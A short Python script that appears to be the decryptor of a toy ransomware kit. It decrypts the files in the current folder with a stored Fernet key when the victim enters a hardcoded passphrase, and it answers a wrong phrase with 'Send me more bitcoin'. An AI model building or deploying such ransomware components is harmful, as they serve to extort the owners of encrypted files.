#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
        #exclude own file and the file have the key
	if file=="voldemort.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	#skip folders/directories
	if os.path.isfile(file):
		files.append(file)


with open("thekey.key","rb") 	as thekey:
	secretkey=thekey.read()

secretphrase="turkkahvesi"
user_phrase=input("Enter the secret phrase to decrypt your files\n")

if secretphrase==user_phrase:
	for file in files:
		with open(file,"rb") as thefile:
			encrypted_content=thefile.read()
		decrypted_content=Fernet(secretkey).decrypt(encrypted_content)
		with open(file,"wb") as thefile:
			thefile.write(decrypted_content)
	print("Congrats, you're files are decrypted. Enjoy your coffee.")
else:
	print("Sorry, wrong secret phrase. Send me more bitcoin.")

